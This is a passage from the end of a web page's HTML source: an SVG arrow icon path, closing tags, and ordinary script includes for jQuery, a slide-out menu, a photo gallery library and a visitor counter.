  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>






  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>










</body>
</html>
